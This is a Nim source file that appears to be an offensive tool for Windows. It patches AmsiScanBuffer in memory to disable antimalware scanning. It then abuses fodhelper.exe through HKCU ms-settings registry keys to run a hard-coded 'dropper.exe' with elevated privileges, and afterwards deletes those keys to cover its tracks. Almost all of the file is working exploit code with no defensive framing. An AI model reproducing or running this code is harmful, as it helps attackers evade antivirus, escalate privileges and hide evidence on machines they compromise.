import registry
import strformat
import winim/lean
import dynlib
import osproc
import strenc
import os

const Exec {.strdefine.}: string = "c:\\users\\olivier\\desktop\\dropper.exe"

# proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
#     return true

# proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
#     return true

# proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
#     return true

when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled



proc Execute() =
    var success = PatchAmsi()
    echo fmt"[*] AMSI disabled: {bool(success)}"

    var 
        key : string
        value : string
        regPath : string
        handle : registry.HKEY



    handle = registry.HKEY_CURRENT_USER
    key = ""
    regPath = "Software\\Classes\\.toto\\Shell\\Open\\Command"
    value = Exec
    echo fmt"[>] Creating registry key {handle}\{regPath}\{key} = {value}"
    setUnicodeValue(regPath, key, value, handle)
    var result = getUnicodeValue(regPath, key, handle)
    echo fmt"[*] Registry key {handle}\{regPath}\{key} = {result}"

    sleep(10000)

    regPath = "Software\\Classes\\ms-settings\\CurVer"
    value = ".toto"
    echo fmt"[>] Creating registry key {handle}\{regPath}\{key} = {value}"
    setUnicodeValue(regPath, key, value, handle)
    result = getUnicodeValue(regPath, key, handle)
    echo fmt"[*] Registry key {handle}\{regPath}\{key} = {result}"

    sleep(10000)

    echo fmt"[>] Starting fodhelper"
    discard execProcess("cmd /c fodhelper.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
    echo fmt"[*] fodhelper ran."

    sleep(10000)

    echo fmt"[>] Covering the tracks..."
    discard execProcess("cmd /c reg delete HKCU\\Software\\Classes\\.toto\\ /f", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})

    sleep(10000)

    discard execProcess("cmd /c reg delete HKCU\\Software\\Classes\\ms-settings\\ /f", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})

    sleep(10000)

    echo fmt"[*] Task Ended"

when isMainModule:
     Execute()